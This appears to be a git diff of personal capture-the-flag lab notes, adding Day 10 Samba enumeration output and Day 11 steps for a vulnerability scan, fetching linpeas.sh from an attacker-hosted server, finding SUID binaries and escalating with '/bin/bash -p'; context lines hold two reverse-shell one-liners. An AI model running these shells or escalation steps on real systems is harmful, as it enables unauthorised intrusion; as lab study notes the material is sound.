@@ -93,3 +93,34 @@ I'm beginning to think that only the first 2 days were actually CTF challenges, 
 bash -i >& /dev/tcp/10.8.97.41/4242 0>&1
 0<&196;exec 196<>/dev/tcp/10.8.97.41/4242; sh <&196 >&196 2>&196
 ```
+
+# Day 10
+
+`export IP=10.10.74.114`
+
+- Using `enum4linux` to get info about samba shares
+
+### Samba shares and users
+Sharename       Type      Comment
+---------       ----      -------
+tbfc-hr         Disk      tbfc-hr
+tbfc-it         Disk      tbfc-it
+tbfc-santa      Disk      tbfc-santa
+
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc: 
+index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc: 
+index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc: 
+
+user:[elfmcskidy] rid:[0x3e8]
+user:[elfmceager] rid:[0x3ea]
+user:[elfmcelferson] rid:[0x3e9]
+
+# Day 11
+
+`export IP=10.10.138.120`
+
+- Start with a network scan `nmap -sV -sC --script=vuln $IP`
+- Download linpeas.sh and host in on a webserver on the attacking machine `python3 -m http.server 8080` (the vulnerable machine does not have internet access)
+- Download linpeas.sh on the vuln machine in /tmp `wget http://10.8.97.41:8080/linpeas.sh`
+- Instead of linpeas, to just find SUID files you can use `find / -perm -u=s -type f 2>/dev/null`
+- Stumbled a bit with what I could actually do with /bin/bash that had the SUID bit set, turned out I had to include the -p switch to turn on privileged mode, so `/bin/bash -p`.
